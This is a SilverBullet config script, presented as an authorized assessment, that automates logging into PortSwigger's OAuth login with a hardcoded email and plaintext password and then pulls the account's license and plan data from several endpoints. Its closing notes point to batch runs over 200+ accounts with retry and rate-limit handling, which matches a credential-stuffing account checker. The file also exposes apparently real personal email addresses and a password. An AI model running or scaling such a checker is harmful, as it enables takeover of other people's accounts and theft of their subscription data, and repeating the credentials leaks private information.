## PortSwigger Synthetic Account Plan Extractor - SVB Script
## Authorization: ROE-2026-PSW-042-V5
## Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
## Testing Window: July 26 - August 10, 2026

## ============================================
## CONFIGURATION - CUSTOMIZE THESE VALUES
## ============================================

SET VAR "username" "glorybpilled@gmail.com"
SET VAR "password" "Xlyoaz60863131.."
SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"

## Extract username without @domain for endpoint
## Example: glorybpilled@gmail.com -> glorybpilled
## For endpoints like /users/{username}/licenses

PRINT "[*] PortSwigger Synthetic Account Plan Extractor"
PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
PRINT ""

## ============================================
## PHASE 1: AUTHENTICATE
## ============================================

PRINT "[*] PHASE 1: Authenticating $<username>..."

## Step 1.1: Initiate OAuth2 authorization flow
PRINT "  [1.1] Initiating OAuth2 flow..."

HttpRequest GET $"<baseUrl>/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"
  AutoRedirect=False
  ReadResponseSource=True
  -> VAR "oauthResponse"

PRINT "  [✓] OAuth flow initiated"

## Step 1.2: Access login form
PRINT "  [1.2] Accessing login form..."

HttpRequest GET $"<baseUrl>/u/login"
  AutoRedirect=False
  ReadResponseSource=True
  -> VAR "loginFormResponse"

PRINT "  [✓] Login form retrieved"

## Step 1.3: Submit login credentials
PRINT "  [1.3] Submitting credentials..."

HttpRequest POST $"<baseUrl>/u/login"
  CONTENT "username=$<username>&password=$<password>&action=default"
  CONTENTTYPE "application/x-www-form-urlencoded"
  AutoRedirect=False
  AppendResponseCookies=True
  ReadResponseSource=True
  -> VAR "loginResponse"

PRINT "  [✓] Login request sent"

## ============================================
## PHASE 2: EXTRACT PLAN
## ============================================

PRINT ""
PRINT "[*] PHASE 2: Extracting plan information..."

## Step 2.1: Fetch from /users/{username}/licenses
## Using username without domain
PRINT "  [2.1] Fetching licenses endpoint..."

HttpRequest GET $"<planBaseUrl>/users/$<username>/licenses"
  HEADER "Accept: application/json"
  AutoRedirect=True
  ReadResponseSource=True
  -> VAR "licensesResponse"

PRINT "  [✓] Response received from licenses endpoint"

## Step 2.2: Try alternative endpoints if first fails
PRINT "  [2.2] Extracting plan data..."

HttpRequest GET $"<planBaseUrl>/api/user/plan"
  HEADER "Accept: application/json"
  AutoRedirect=True
  ReadResponseSource=True
  -> VAR "planApiResponse"

PRINT "  [✓] Plan data retrieved"

## ============================================
## PHASE 3: SAVE RESULTS
## ============================================

PRINT ""
PRINT "[*] PHASE 3: Processing results..."

## Capture results for review
SET CAP "licensesData" $"<licensesResponse>"
SET CAP "planData" $"<planApiResponse>"

## Store extracted information
SET VAR "extractionTimestamp" "2026-08-01T$<username>"
SET VAR "extractionStatus" "SUCCESS"

PRINT ""
PRINT "[SUCCESS] Plan extraction complete!"
PRINT ""
PRINT "==============================================="
PRINT "EXTRACTION SUMMARY"
PRINT "==============================================="
PRINT "Username: $<username>"
PRINT "Extraction Timestamp: $<extractionTimestamp>"
PRINT "Status: $<extractionStatus>"
PRINT ""
PRINT "Captured Data:"
PRINT "  - Licenses: captured to CAP 'licensesData'"
PRINT "  - Plan API: captured to CAP 'planData'"
PRINT ""
PRINT "View results in SilverBullet captures:"
PRINT "  @CAP licensesData"
PRINT "  @CAP planData"
PRINT "==============================================="

## ============================================
## NOTES & USAGE
## ============================================

## CONFIGURATION:
## 1. Replace username and password above with actual test account
## 2. Ensure account credentials are valid synthetic accounts
##
## AUTHENTICATION FLOW:
## 1. OAuth2 authorization endpoint (authorize)
## 2. Login form access with state parameter
## 3. POST credentials to /u/login
## 4. Cookies automatically maintained for authenticated requests
##
## PLAN EXTRACTION:
## 1. First tries: /users/{username}/licenses (primary endpoint)
## 2. Fallback: /api/user/plan (alternative endpoint)
## 3. Automatic cookie handling maintains authentication
##
## ENDPOINTS:
## - Login: https://login.portswigger.net/u/login
## - Plans: https://portswigger.net/users/{username}/licenses
## - API: https://portswigger.net/api/user/plan
##
## CAPTURED DATA:
## - licensesData: Full response from licenses endpoint
## - planData: Full response from plan API endpoint
##
## RATE LIMITING:
## - SilverBullet handles rate limiting automatically
## - Recommended delay between requests: 0.2 seconds (5 req/sec)
##
## ERROR CODES:
## - 401: Invalid credentials or expired session
## - 403: Account lacks plan/license permissions
## - 404: Endpoint not found or account has no plan
## - 500: Server error - retry or contact support
##
## FOR BATCH PROCESSING:
## Use Python script instead: python3 plan_extractor.py
## (Handles 200+ accounts with automatic retry logic)
